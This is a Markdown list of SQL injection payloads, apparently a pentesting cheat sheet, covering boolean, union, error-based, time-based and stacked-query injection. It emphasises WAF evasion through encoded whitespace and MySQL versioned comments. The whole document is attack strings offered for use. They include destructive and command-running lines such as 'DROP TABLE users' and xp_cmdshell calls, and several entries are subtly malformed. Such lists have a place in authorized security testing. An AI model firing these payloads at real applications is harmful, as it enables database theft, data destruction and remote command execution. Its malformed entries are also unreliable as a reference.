# SQL Injection Payloads (All Categories with WAF Bypass & MySQL Versioned Comments)

A comprehensive list of **SQL Injection payloads** covering all major categories:  
**Boolean-based**, **Comment-based**, **Union-based**, **Error-based**, **Time-based**, and **Stacked Queries**.  

Includes **common WAF bypass techniques** and **MySQL versioned comment bypass** for optimal testing and evasion.

---

## Table of Contents

- [Boolean-based Payloads](#boolean-based-payloads)
- [Comment-based Payloads](#comment-based-payloads)
- [Union-based Payloads](#union-based-payloads)
- [Error-based Payloads](#error-based-payloads)
- [Time-based Payloads](#time-based-payloads)
- [Stacked Queries Payloads](#stacked-queries-payloads)

---

## Complete Payload List

### Boolean-based Payloads
' OR '1'='1  
" OR "1"="1  
' OR 1=1--  
" OR 1=1--  
' OR 'a'='a  
" OR "a"="a  
1 OR 1=1  
1' OR 1=1--  
1" OR 1=1--  
' OR '1'='1'#  
' OR '1'='1'/*  
1 OR 1=1#  
1 OR 1=1/*  
1 OR '1'='1'  
1/**/OR/**/1=1  
1%20OR%201=1  
1%09OR%091=1  
1%0AOR%0A1=1  
1%0DOR%0D1=1  
1%0COR%0C1=1  
'/*!OR*/'1'='1  
' oR '1'='1  
' Or '1'='1  
'/**/oR/**/'1'='1  
' OR%00'1'='1  
'/**!50000OR*/+'1'='1  
"/*!50000OR*/+"1"="1  
1/**!50000OR*/+1=1  
'/**!50000oR*/+'a'='a  
1/**!50000OR*/%0A1=1  
'/**!50000OR*/%0A'1'='1  

### Comment-based Payloads  
--  
--+  
#  
/* */  
-- -  
--a  
--1  
--%0A  
%23  
%2D%2D%20  
%2D%2D%0A  
/*%0A*/  
%2F%2A%2A%2F  
/*!*/--+  
/*!*/%23  
--%09  
--%0D  
--%0C  
/*!50000--*/  
/*!50000#*/  
/*!50000--%0A*/  
/*!50000--%09*/  

### Union-based Payloads  
' UNION SELECT NULL--  
' UNION SELECT 1,2--  
' UNION SELECT 1,2,3--  
' UNION SELECT database(),user()--  
' UNION SELECT @@version, NULL--  
' UNION SELECT version(), NULL--  
' UNION ALL SELECT NULL,NULL--  
' UNION DISTINCT SELECT NULL,NULL--  
' UNION SELECT table_name FROM information_schema.tables--  
'/**/UNION/**/SELECT/**/NULL--  
' UNION%0ASELECT%0ANULL--  
'/*!50000UNION*/SELECT NULL--  
'/*!uNiOn*/ /*!SeLeCt*/ NULL--  
'/**/UNION%0ASELECT/**/NULL--  
'/**/UNION%0A/**/SELECT/**/NULL--  
'/*!UNION*/+/*!SELECT*/+NULL--  
%27UNION%0ASELECT%201,2--  
'/**!50000UNION*/+/**!50000SELECT*/+NULL--  
'/**!50000UNION*/+/**!50000SELECT*/+1,2--  
'/**!50000UNION*/%0A/**!50000SELECT*/%0ANULL--  
'/**!50000UNION*/%0A/**!50000SELECT*/%0A1,2,3--  
'/**!50000UNION*/+ALL+/**!50000SELECT*/+NULL,NULL--  

### Error-based Payloads  
' AND updatexml(1,concat(0x7e,user(),0x7e),1)--  
' AND extractvalue(1,concat(0x7e,database(),0x7e),1)--  
' AND 1=CONVERT(int, @@version)--  
' AND CAST((SELECT @@version) AS int)--  
' AND exp(~(SELECT * FROM (SELECT user())x))--  
' AND 1=LIKE(user())--  
'/**/AND/**/updatexml(1,concat(0x7e,user(),0x7e),1)--  
'/*!AND*/updatexml(1,concat(0x7e,user(),0x7e),1)--  
'/**/AND/**/extractvalue(1,concat(0x7e,database(),0x7e),1)--  
'/*!AND*/extractvalue(1,concat(0x7e,database(),0x7e),1)--  
' AND%0Aupdatexml(1,concat(0x7e,user(),0x7e),1)--  
' AND%09extractvalue(1,concat(0x7e,database(),0x7e),1)--  
'/**!50000AND*/+updatexml(1,concat(0x7e,user(),0x7e),1)--  
'/**!50000AND*/+extractvalue(1,concat(0x7e,database(),0x7e),1)--  
'/**!50000AND*/+1=CONVERT(int,@@version)--  
'/**!50000AND*/+CAST((SELECT+@@version)+AS+CHAR)--  

### Time-based Payloads  
' OR SLEEP(5)--+  
' OR IF(1=1,SLEEP(5),0)--+  
' WAITFOR DELAY '0:0:5'--  
1 AND SLEEP(5)--  
1 OR benchmark(10000000,MD5(1))--  
'/**/OR/**/SLEEP(5)--+  
'/*!OR*/SLEEP(5)--+  
' OR%0ASLEEP(5)--+  
'/**/OR/**/IF(1=1,SLEEP(5),0)--+  
'/*!OR*/IF(1=1,SLEEP(5),0)--+  
1/**/AND/**/SLEEP(5)--  
1%0AAND%0ASLEEP(5)--  
'/**!50000OR*/+SLEEP(5)--+  
'/**!50000OR*/+IF(1=1,SLEEP(5),0)--+  
1/**!50000AND*/+SLEEP(5)--  
1/**!50000OR*/+BENCHMARK(10000000,MD5(1))--  

### Stacked Queries Payloads  
1; SELECT @@version--  
1; EXEC xp_cmdshell('whoami')--  
1; DROP TABLE users--  
1; INSERT INTO users('test','pass')--  
1;%0aSELECT%20@@version--  
1;/**/SELECT/**/@@version--  
1;/*!EXEC*/xp_cmdshell('whoami')--  
1;%0aDROP%20TABLE%20users--  
1;/**!50000SELECT*/+@@version--  

---

*This curated list enables thorough testing of SQL injection vectors, emphasizing evasion of Web Application Firewalls and exploiting MySQL-specific quirks.*  
*Use responsibly in authorized security assessments only.*
